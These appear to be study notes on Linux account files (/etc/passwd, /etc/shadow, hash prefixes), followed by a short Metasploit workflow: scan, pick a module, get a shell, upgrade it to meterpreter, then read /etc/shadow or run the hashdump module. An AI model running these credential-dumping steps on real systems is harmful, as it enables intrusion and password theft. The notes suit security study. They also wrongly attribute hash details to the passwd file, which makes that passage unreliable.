Linux has multi-user support and as a result, multiple users can access the system simultaneously. This can be seen as both an advantage and disadvantage from a security perspective, in that multiple accounts offer multiple access vectors for attackers.

All of the information for all accounts on Linux is stored in the passwd file located in /etc/passwd

We cannot view the passwords for the users in the passwd file because they are encrypted and the passwd file is readable by any user on the systme.

All the encrypted passwords for the users are stored in the shadow file. It can be found in /etc/shadow

The shadow file can only be accessed and read by the root account, this is a very important security feature as it prevents other accounts on the system from accessing the hashed passwords

The passwd file gives us info in regards to the hashing algorithm that is being used and the password hash, this is very helpful as we are able to determine the type of hashing algorithm that is being used and its strength. We can determine this by looking at the number after the username encapsulated by the dollar symbol

$1 - MD5
$2 - Blowfish
$5 - SHA-256 *usually uses this very hard to crack algorithm*
$6 - SHA-512 *usually uses this very hard to crack algorithm*

-----------------------------Exploitation--------------------------------------

nmap -sV <ip>
searchsploit <service you think is vulnerable>
service postgresql start && msfconsole
search proftpd (example)
use <module>
**now you get a command shell session**
/bin/bash -i (used to obtain a bash session)
^Z (back out of session 1)
sessions -u 1 (upgrades the session to a meterpreter session)
sessions (lists sessions)
session 2 (use whatever number is now the meterpreter session)
cat /etc/shadow
**you can also use a hashdump module**
module is called post/linux/gather/hashdump
